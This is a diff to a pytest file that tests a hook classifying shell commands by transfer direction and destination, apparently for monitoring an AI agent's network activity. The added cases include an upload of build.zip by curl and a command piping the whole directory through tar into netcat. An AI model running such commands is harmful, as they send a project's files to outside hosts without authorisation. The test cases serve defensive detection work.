@@ -21,7 +21,7 @@ import pytest
 _ROOT = Path(__file__).parent.parent
 _HOOK_PATH = _ROOT / "hooks" / "unbound.py"
 # Also pinned in websentry-ai/setup tests/test_transfer_destination.py; update both together.
-BLOCK_SHA256 = "5295a3e35bb3ce6d3efa980c9e4c1cf795b84746944039bc8c627f47b194219c"
+BLOCK_SHA256 = "7e721b4ef91e0b7be0fc063945e231df4800c4fa7d1d684e6975187f170aee5a"
 START = "# KEEP IN SYNC: transfer resolution"
 END = "# --- end transfer resolution ---"
 # Not a real credential; it only has to sit where a login goes.
@@ -123,6 +123,8 @@ def test_a_shell_call_carries_its_transfer_and_every_entry_its_call_time(env):
     ("Invoke-RestMethod https://example.com/api -Method Post -Body $b", [("out", "example.com", "public")]),
     ("false && (echo x; curl https://cgnat.example/a); curl https://example.com/b", [("in", "example.com", "public")]),
     ("if false; then curl https://cgnat.example/a; else curl https://example.com/b; fi", [("in", "example.com", "public")]),
+    ("curl --upload-file=build.zip https://files.acme-infra.net/up", [("out", "files.acme-infra.net", "private")]),
+    ("tar c . | sh -c 'nc example.com 80'", [("out", "example.com", "public")]),
     ("ls -la", []),
 ])
 def test_tools_directions_and_the_shell_reading(env, command, expected):
